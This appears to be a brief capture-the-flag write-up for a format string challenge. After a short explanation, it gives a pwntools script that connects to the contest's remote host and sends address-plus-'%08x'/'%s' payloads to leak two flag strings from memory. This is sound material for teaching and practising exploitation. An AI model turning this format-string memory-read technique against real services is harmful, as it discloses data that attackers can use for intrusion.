Okay, as the description suggests, the challenge is about a format string attack.
I used Ghidra to disassemble the binary. 


Thus, we found the respective addresses where flag1 and flag2 are located. Now, we only need to extract the data from that address which can be done by exploiting the format string vulnerability. here's a simple script for it.

```
#!/usr/bin/env python
from pwn import *
flag1 = 0x804a02c
flag2 = 0x804a040
port =  18137
host = "hack.scythe2021.sdslabs.co"
#target = process("./f_me")   use it to test the exploit locally

target=remote(host,port)

# First send this payload, you'll get the first part of the flag
#payload = p32(flag1) +('%08x '*6+'%s').encode()

# After you get the first part of the flag, use this payload after removing the first one
#payload = p32(flag2) +('%08x '*6+'%s').encode()
target.recvuntil("ploxx")
target.sendline(payload)
target.interactive()
```
